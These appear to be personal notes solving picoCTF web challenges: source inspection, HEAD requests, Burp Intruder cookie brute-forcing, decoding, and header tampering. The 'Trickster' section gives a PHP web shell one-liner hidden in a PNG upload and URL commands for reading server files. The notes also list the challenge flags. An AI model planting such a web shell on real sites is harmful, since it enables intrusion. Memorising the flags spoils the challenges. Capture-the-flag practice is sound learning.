===========
Scavenger Hunt - check source codes and comments
===========
Go to this website > http://mercury.picoctf.net:39491/ > view source code
there's the first part of the flag in the comment > 2nd part is in .css > Third part is missing
I looked into .js file, there's a comment "How can I keep Google from indexing my website?" > well, it's the robot.txt
In URL > http://mercury.picoctf.net:39491/robots.txt > There's the 3rd part and clue for 4th > google "apache server access file"
# https://httpd.apache.org/docs/2.4/howto/htaccess.html - this talks about apache http sever file
In URL > view-source:http://mercury.picoctf.net:39491/.htaccess > 4th flag with 5th clue website on MAC STORE
# Just google, the clue from comment, make it make sense though
In URL > view-source:http://mercury.picoctf.net:39491/.DS_Store > There's the last flag
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_f7ce8828}}

==========
GET aHEAD - try messing with GET, POST and HEAD, and others
=========
Open up the link > foxy proxy ZAP > change GET or POST into HEAD >
request shows the flag > picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}

========
Cookies - check the cookie values, id, anything that can be easily guessed or decode
========
May have something to do with cookies > dev tools > Storage > Cookies >
Seems like the value of cookie can be guessed > I manually changed the cookie value from -1 to 10 >
Gotta use burp since it's taking longer than expected > Open BURPsuite > do the thing >
intercept the traffic with proxy > in last GET or POST request before displaying the result > right click to intruder
> in intruder > Add cookie: name: $Value$ > payloads tab > copy and paste my payload.txt file which is 0-50 > settings tab >
Grep - Match type "picoCTF{" since that's the format of their flag > 
Zap method is same same

===========
Insp3ct0r - insoect source code
===========
Copy-Paste link > view source code > first flag in the comment section of HTML > second in CSS >
third in JS file

=============
Boormarklet - check the js, maybe the function is digging its own grave
============
Start instance > go to link > you'll see this >         
-----------------------------------------------------------------------
javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÓÇ¡¥Ìí";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();
----------------------------------------------------------------------
> copy that code and paste it in the console > to see the alert box with flag

==========
WebDecode - look for encoded strings
==========
In the web page > navigate around > In about tab > I inspected the page >
saw an encrypted string "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMWY4MzI2MTV9" 
> tried to convert with base64 to txt online > flag is shown

===========
IntroToBurp - play with headers like Content-Type to check if server checks for malformed requests
===========
I just modified the HTTP header Content-Type to blank > forward > and it gave me the flag >
Then I tried deleting the entire line > click forward > then there's the flag

===========
Unminify - inspect source codes
===========
View source code > beautifier website > find picoCTF{ > look around >
You shall see the flag

===========
Trickster - use burp, check for technologies being used like php, be creative
===========
It's an upload photo web site > in burpsuite it can be seen that it uses PHP >
So I uploaded a random .png file > modify extension by adding .php > "filename.png.php" >
modified the body through burp suite > leaving the .png signature which is >
PNG

>
it can also be found in wikipedia just look up hex value for png file >
then I added this > <?=`$_GET[0]`?> > a php code so I can use commands in url >
look for directory where the files are potentially saved > /files, /images, /image, /uploads >
or use dirb so you don't have to think > for the main event > turn off the intercept >
play with URL >
targetIP.net/uploads/filename.png.php?0=commands
/uploads/bash.png.php?0=cd ..
/uploads/bash.png.php?0=ls
/uploads/bash.png.php?0=cd ..;ls > this one shows some files
/uploads/bash.png.php?0=cd ..;pwd > this one show the current dir which is > /var/www/html
Maybe I should open one of the files in here > 
/uploads/bash.png.php?0=cd ..;cat GNTDOMBWGIZDE.txt > and that gave me the flag












